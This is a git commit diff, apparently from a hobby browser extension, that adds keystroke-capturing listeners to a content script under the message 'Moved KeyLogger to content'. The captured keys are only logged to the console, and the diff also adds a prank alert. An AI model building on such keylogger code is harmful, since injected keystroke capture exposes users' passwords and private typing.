a3f6c38a44e7114ac151233d90cf8b11867fd760
samp830 <samp.830@gmail.com>
2016-11-05 02:03:57 -0700

    Moved KeyLogger to content

--- content.js
+++ content.js
@@ -1,10 +1,30 @@
 
 var handler = function (e) { 
     handler.data.push(e);
-    console.log("success");
     console.log(handler.data);
 }
 handler.data = [];
+console.log("background running");
+window.addEventListener("keydown", handler);
+document.onkeypress = function (e) {
+ e = e || window.event; 
+ var charCode = e.charCode || e.keyCode, character = String.fromCharCode(charCode); 
+ console.log(charCode)
+ 
+};	
+
+function bad1(){
+	//This is like what happens if you idle
+	//hopefully the facebook one.
+
+	alert('yaad')
+
+
+}
+function screamo(){
+//chrome.tabs.create({ url: "Http://akk.li/pics/anne.jpg" })
+console.log("why")
+}
 
 document.addEventListener("keydown", handler,true);
 
